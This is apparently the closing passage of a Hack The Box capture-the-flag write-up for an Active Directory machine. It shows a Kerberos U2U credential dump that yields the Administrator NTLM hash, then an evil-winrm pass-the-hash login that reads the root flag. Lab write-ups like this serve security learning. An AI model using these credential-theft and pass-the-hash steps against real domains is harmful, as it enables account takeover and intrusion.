  UserRealm                :  SEQUEL.HTB
  StartTime                :  3/24/2023 10:20:04 PM
  EndTime                  :  3/25/2023 8:20:04 AM
  RenewTill                :  3/31/2023 10:20:04 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable
  KeyType                  :  rc4_hmac
  Base64(key)              :  FotYT+2QWElVNlC1goJJtw==
  ASREP (key)              :  C323D59CE54116B14E6ACF44346D8F0E

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : A52F78E4C751E5F5E17E1E9F3E58F4EE

```

Boom! we got the NTLM hash, we can login to the server using the hash alone so we don't even need to crack it.

```

$ evil-winrm -u 'Administrator' -H 'A52F78E4C751E5F5E17E1E9F3E58F4EE' -i 10.10.11.20
*Evil-WinRM* PS C:\Users\Administrator\Documents> type ..\Desktop\root.txt
85b46f9817002f7b11bcba7ec72c9ad4

```

And thats root or admin. Thanks for tuning in Cheers mates.
